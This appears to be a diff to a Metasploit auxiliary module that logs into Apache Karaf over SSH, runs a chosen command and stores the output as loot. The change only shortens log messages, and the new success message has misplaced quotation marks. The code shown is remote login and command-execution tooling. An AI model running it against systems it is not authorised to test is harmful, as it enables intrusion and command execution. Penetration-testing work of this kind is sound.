@@ -87,25 +87,25 @@ class MetasploitModule < Msf::Auxiliary
         Net::SSH.start(ip, user, opts)
       end
       if ssh
-        print_good("#{ip}:#{rport} - Login Successful (#{user}:#{pass})")
+        print_good("Login Successful ('#{user}:#{pass})'")
       else
-        print_error "#{ip}:#{rport} - Unknown error"
+        print_error "Unknown error"
       end
     rescue OpenSSL::Cipher::CipherError => e
-      print_error("#{ip}:#{rport} SSH - Unable to connect to this Apache Karaf (#{e.message})")
+      print_error("SSH - Unable to connect to this Apache Karaf (#{e.message})")
       return
     rescue Rex::ConnectionError
       return
     rescue Net::SSH::Disconnect, ::EOFError
-      print_error "#{ip}:#{rport} SSH - Disconnected during negotiation"
+      print_error "SSH - Disconnected during negotiation"
       return
     rescue ::Timeout::Error
-      print_error "#{ip}:#{rport} SSH - Timed out during negotiation"
+      print_error "SSH - Timed out during negotiation"
       return
     rescue Net::SSH::AuthenticationFailed
-      print_error "#{ip}:#{rport} SSH - Failed authentication"
+      print_error "SSH - Failed authentication"
     rescue Net::SSH::Exception => e
-      print_error "#{ip}:#{rport} SSH Error: #{e.class} : #{e.message}"
+      print_error "SSH Error: #{e.class} : #{e.message}"
       return
     end
 
@@ -113,19 +113,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    print_status("#{ip}:#{rport} - Attempt to login...")
+    print_status("Attempt to login...")
     ssh = do_login(username, password, ip)
     if ssh
       output = ssh.exec!("#{cmd}\n").to_s
       if output
-        print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
+        print_good("Command successfully executed.  Output: #{output}")
         store_loot("apache.karaf.command",
                    "text/plain",
                    ip,
                    output)
-        vprint_status("#{ip}:#{rport} - Loot stored at: apache.karaf.command")
+        vprint_status("Loot stored at: apache.karaf.command")
       else
-        print_error "#{ip}:#{rport} - Command failed to execute"
+        print_error "Command failed to execute"
       end
     end
   end
